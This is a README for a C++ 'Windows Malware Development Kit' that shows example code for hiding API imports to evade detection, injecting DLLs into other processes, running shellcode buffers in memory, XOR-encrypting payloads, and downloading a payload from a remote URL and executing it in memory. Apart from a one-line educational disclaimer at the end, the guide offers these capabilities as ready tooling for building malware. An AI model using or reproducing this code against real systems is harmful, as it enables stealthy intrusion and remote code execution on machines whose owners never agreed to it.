# Windows Malware Development Kit (MDK) - Usage Guide

The **Windows Malware Development Kit (MDK)** provides a framework for interacting with Windows processes, memory, hashing, and the Windows registry. This guide covers the core functionality of the framework with practical examples.

### API Evasion
MDK directly resolves API calls instead of linking them at compile-time, preventing them from appearing in the Import Address Table (IAT). This allows for stealthier execution by dynamically locating and invoking functions at runtime.

## Installation
Ensure you have the required dependencies set up before using MDK.

```cpp
#include <mdk.h>
```

Link against the necessary libraries when compiling your project.

## Features & Usage

### 1. Process Management
MDK allows interacting with Windows processes and their threads.

#### Example:
```cpp
// Create a new process object
auto process = mdk::process("notepad.exe");

// Access process attributes
process.handle;
process.pid;
process.threads();

// Enumerate process threads
for (mdk::thread thread : process.threads())
{
    // Access thread attributes
    thread.handle;
    thread.tid;
}
```

### 2. DLL Injection and API Calls
MDK supports DLL injection and dynamic function resolution.

#### Example:
```cpp
// Create a new process
auto notepad = mdk::process("Notepad.exe");

// Load a DLL
auto dll = mdk::dll("kernel32.dll");

// Inject the DLL into the process
notepad.inject(&dll);

// Load user32.dll
auto dll = mdk::dll("user32.dll");

// Locate and execute MessageBoxW
(*(void(*)(int, LPCSTR, LPCSTR, int)) dll.find("MessageBoxW"))(0, "Injected Message", "MDK Example", 0);

// Call MessageBoxA from user32.dll (simplifies the above)
dll.call<void>("MessageBoxA", 0, "Injected Message", "MDK Example", 0);

// Same as above but with explicit typing
dll.call<VOID, INT, LPCSTR, LPCSTR, INT>("MessageBoxA", 0, "Injected Message", "MDK Example", 0);

// DLL attributes
dll.handle;
dll.name;
dll.size;
```

### 3. Memory Buffers
MDK provides various buffer management functionalities.

#### Example:
```cpp
// Create buffers with different initialization states
auto i = mdk::buffer();       // Single-byte buffer
auto ii = mdk::buffer(32);    // 32-byte uninitialized buffer

// Create a buffer with predefined data
unsigned char shellcode[12] = "\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64";
auto buf = mdk::buffer(&shellcode, 12); // 12-byte initialized buffer

// Access buffer attributes
buf.file;    // Memory-mapped file
buf.handle;
buf.size;

// Execute the buffer in memory
buf.execute();
```

### 4. Encryption and Hashing
MDK allows encrypting buffers using built-in algorithms.

#### Example:
```cpp
// Create an XOR encryption algorithm with a 32-byte key
auto algorithm = mdk::hash::xor_(32);

// Encrypt the buffer in memory
buf.encrypt(&algorithm);
```

### 5. Internet Payload Downloading
MDK enables downloading and executing payloads directly in memory.

#### Example:
```cpp
// Create an internet handler
auto internet = mdk::internet();

// Download payload into a buffer
auto buffer = internet.download("http://example.com/payload", 512);

// Execute the downloaded buffer
buffer.execute();

// Internet attributes
internet.handle;
```

### 6. Registry Manipulation
MDK enables reading and writing to the Windows registry.

#### Example:
```cpp
// Define a buffer containing data to write
unsigned char data[] = "MDK Registry Example";
auto buffer = mdk::buffer(data, sizeof(data));

// Open a registry key
auto registry = mdk::registry(HKEY_CURRENT_USER, "Software\Example");

// Write data to the registry
registry.set("ExampleKey", &buffer);

// Retrieve a registry value
mdk::buffer result = registry.get("Desktop", "Wallpaper");
```

### 7. Static Library Access
MDK statically defines commonly used libraries for minimal memory overhead.

#### Example:
```cpp
// Access predefined libraries
mdk::nt().kernel32;
mdk::nt().wininet;
mdk::nt().advapi32;

// Example: Call GetProcessVersion via kernel32
auto version = mdk::nt().kernel32.call<DWORD>("GetProcessVersion", 0);
```

## Disclaimer
This framework is provided for educational and research purposes **only**. Unauthorized usage for malicious intent is strictly prohibited.

